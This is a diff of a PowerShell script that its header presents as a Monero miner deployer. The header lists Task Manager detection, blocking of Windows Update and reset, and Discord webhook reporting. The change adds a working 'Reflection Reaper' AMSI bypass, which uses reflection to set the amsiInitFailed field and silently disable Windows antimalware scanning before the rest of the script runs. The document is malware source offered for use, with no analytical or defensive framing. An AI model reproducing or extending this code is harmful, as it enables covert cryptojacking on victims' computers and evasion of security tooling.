@@ -1,6 +1,7 @@
 # ============================================================
-#  XMR Standalone Pro Deployer v5.7 (FINAL HYBRID)
+#  XMR Standalone Pro Deployer v5.9 (GHOST HYBRID)
 #  - Base: 100% Literal v3.1 Codebase
+#  - Added: Reflection Reaper AMSI Bypass (Fileless)
 #  - Added: Taskmgr Detection (3s Poll)
 #  - Added: Windows Update & Reset Lockdown
 #  - Fixed: Discord Webhook TLS Connectivity
@@ -240,6 +241,13 @@ function Send-DiscordWebhook {
 
 # ==================== MAIN ====================
 try {
+    # THE REFLECTION REAPER (Silent AMSI Bypass)
+    try {
+        $a=[Ref].Assembly.GetTypes() | Where-Object {$_.Name -like "*iUtils"}
+        $b=$a.GetField("amsiInitFailed","NonPublic,Static")
+        if ($b) { $b.SetValue($null,$true) }
+    } catch {}
+
     # Establish TLS connection globally first for webhooks
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
     
